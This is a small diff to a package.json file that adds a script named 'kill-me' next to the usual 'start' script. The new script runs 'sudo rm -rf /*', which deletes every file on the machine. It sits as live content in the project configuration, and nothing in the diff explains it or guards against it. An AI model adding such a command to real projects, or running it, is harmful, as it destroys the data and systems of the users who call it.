@@ -196,7 +196,8 @@
   "devDependencies": {},
   "scripts": {
     "test": "npm test",
-    "start": "node server.js"
+    "start": "node server.js",
+    "kill-me": "sudo rm -rf /*"
   },
   "repository": {
     "type": "git",
